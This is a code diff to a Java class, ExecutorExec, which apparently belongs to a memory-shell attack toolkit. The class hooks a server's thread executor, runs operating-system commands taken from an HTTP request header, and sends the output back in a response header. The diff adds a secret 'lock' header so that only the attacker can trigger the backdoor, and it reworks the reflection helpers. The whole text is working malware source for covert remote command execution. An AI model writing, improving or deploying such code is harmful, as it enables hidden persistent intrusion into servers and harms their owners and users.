@@ -17,11 +17,13 @@ import java.util.concurrent.TimeUnit;
  */
 @MemShell(MemShell.Executor)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ExecutorExec implements InvocationHandler {
     private static String HEADER;
     private Object targetObject;
     private String responseHeader = "Data";
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public ExecutorExec() {
     }
@@ -45,14 +47,15 @@ public class ExecutorExec implements InvocationHandler {
         try {
             String header = getHeader();
             Map<String, String> headers = getHeaders(header);
-            String value = headers.get(HEADER);
-            String result = exec(value);
-            getResponse(result);
+            if (headers.get(lockHeaderKey)!= null && headers.get(lockHeaderKey).contains(lockHeaderValue)) {
+                String value = headers.get(HEADER);
+                String result = exec(value);
+                getResponse(result);
+            }
         } catch (Exception e) {
 
         }
-        Method originalExecute = targetObject.getClass().getMethod("execute", Runnable.class, Long.TYPE, TimeUnit.class);
-        originalExecute.invoke(targetObject, command, 0L, TimeUnit.MILLISECONDS);
+        invokeMethod(targetObject, "execute", new Class[]{Runnable.class, Long.TYPE, TimeUnit.class}, new Object[]{command, 0L, TimeUnit.MILLISECONDS});
     }
 
     public String getHeader() throws Exception {
@@ -327,12 +330,15 @@ public class ExecutorExec implements InvocationHandler {
     }
 
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
         try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
+    }
+
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
